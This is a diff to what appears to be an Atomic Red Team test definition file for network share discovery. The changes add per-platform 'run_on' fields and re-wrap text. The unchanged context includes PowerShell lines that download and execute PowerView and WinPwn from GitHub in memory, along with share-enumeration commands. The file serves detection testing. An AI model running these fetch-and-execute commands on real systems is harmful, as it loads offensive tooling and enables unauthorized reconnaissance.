@@ -18,6 +18,8 @@ atomic_tests:
       smbutil view -g //#{computer_name}
       showmount #{computer_name}
     name: sh
+  run_on:
+  - macos
 - name: Network Share Discovery - linux
   auto_generated_guid: 875805bc-9e86-4e87-be86-3a5527315cae
   description: |
@@ -32,7 +34,8 @@ atomic_tests:
     package_installer:
       description: Package installer command. Debian - apt install samba
       type: string
-      default: (which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)
+      default: (which yum && yum -y install epel-release samba)||(which apt-get &&
+        DEBIAN_FRONTEND=noninteractive apt-get install -y samba)
   dependency_executor_name: bash
   dependencies:
   - description: |
@@ -46,6 +49,8 @@ atomic_tests:
       sudo smbstatus --shares
     name: bash
     elevation_required: true
+  run_on:
+  - linux
 - name: Network Share Discovery - FreeBSD
   auto_generated_guid: 77e468a6-3e5c-45a1-9948-c4b5603747cb
   description: |
@@ -74,7 +79,8 @@ atomic_tests:
       smbstatus --shares
     name: sh
     elevation_required: true
-
+  run_on:
+  - freebsd
 - name: Network Share Discovery command prompt
   auto_generated_guid: 20f1097d-81c1-405c-8380-32174d493bbb
   description: |
@@ -91,6 +97,8 @@ atomic_tests:
     command: |
       net view \\#{computer_name}
     name: command_prompt
+  run_on:
+  - windows
 - name: Network Share Discovery PowerShell
   auto_generated_guid: 1b0814d1-bb24-402d-9615-1b20c50733fb
   description: |
@@ -102,15 +110,21 @@ atomic_tests:
     command: |
       get-smbshare
     name: powershell
+  run_on:
+  - windows
 - name: View available share drives
   auto_generated_guid: ab39a04f-0c93-4540-9ff2-83f862c385ae
-  description: View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session
+  description: View information about all of the resources that are shared on the
+    local computer Upon execution, avalaible share drives will be displayed in the
+    powershell session
   supported_platforms:
   - windows
   executor:
     command: |
       net share
     name: command_prompt
+  run_on:
+  - windows
 - name: Share Discovery with PowerView
   auto_generated_guid: b1636f0a-ba82-435c-b699-0d78794d8bfd
   description: |
@@ -130,9 +144,13 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
     name: powershell
+  run_on:
+  - windows
 - name: PowerView ShareFinder
   auto_generated_guid: d07e4cc1-98ae-447e-9d31-36cb430d28c4
-  description: PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.
+  description: PowerView is a PowerShell tool to gain network situational awareness
+    on Windows domains. ShareFinder finds (non-standard) shares on machines in the
+    domain.
   supported_platforms:
   - windows
   input_arguments:
@@ -152,6 +170,8 @@ atomic_tests:
       Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"
       Invoke-ShareFinder #{parameters}
     name: powershell
+  run_on:
+  - windows
 - name: WinPwn - shareenumeration
   auto_generated_guid: 987901d1-5b87-4558-a6d9-cffcabc638b8
   description: Network share enumeration using the shareenumeration function of WinPwn
@@ -163,6 +183,8 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       shareenumeration -noninteractive -consoleoutput
     name: powershell
+  run_on:
+  - windows
 - name: Network Share Discovery via dir command
   auto_generated_guid: 13daa2cf-195a-43df-a8bd-7dd5ffb607b5
   description: |
@@ -181,3 +203,5 @@ atomic_tests:
       dir \\#{computer_ip}\admin$
       dir \\#{computer_ip}\IPC$
     name: command_prompt
+  run_on:
+  - windows
